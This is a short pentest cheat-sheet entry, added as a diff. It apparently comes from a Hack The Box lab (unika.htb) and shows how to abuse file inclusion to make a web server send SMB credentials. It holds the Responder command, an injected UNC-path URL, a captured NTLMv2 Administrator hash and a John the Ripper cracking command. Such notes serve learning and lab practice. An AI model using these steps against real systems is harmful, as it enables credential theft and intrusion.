@@ -1,0 +1,20 @@
+Remote File Inclusion (RFI)
+Description: If you are on the same local network as the web server you are attacking, you can trick the web server to making smb calls by putting the UNC path in the parameter
+
+Running responder in default mode
+sudo responder -I tun0
+
+On the web server, find a parameter you can update and put in //<your ip>/file
+Example - http://unika.htb/?page=//10.10.16.16/file
+
+If the web server is vulnerable, you will receive a request in responder with the user account the web service is running under
+
+[+] Listening for events...                                                                                                     
+
+
+[SMB] NTLMv2-SSP Client   : 10.129.95.234
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:17bffd11120e251f:6EF49FA80EFD6C05393EE08B85A30A00:010100000000000000089B06F5B5DB01CACDC2D190F3B271000000000200080053004A004100310001001E00570049004E002D004B004C00550033004800320054005200510056004B0004003400570049004E002D004B004C00550033004800320054005200510056004B002E0053004A00410031002E004C004F00430041004C000300140053004A00410031002E004C004F00430041004C000500140053004A00410031002E004C004F00430041004C000700080000089B06F5B5DB0106000400020000000800300030000000000000000100000000200000BD731471CB56F8BA38446230F84F6F4BCD084366F6187E1E492ADD5531EB914B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0039000000000000000000
+
+You can then save the hash value and use John to crack it
+john responder-hash.txt --wordlist=/home/m33gosh/Documents/shared_tools/wordlists/rockyou.txt --format=netntlmv2 --show
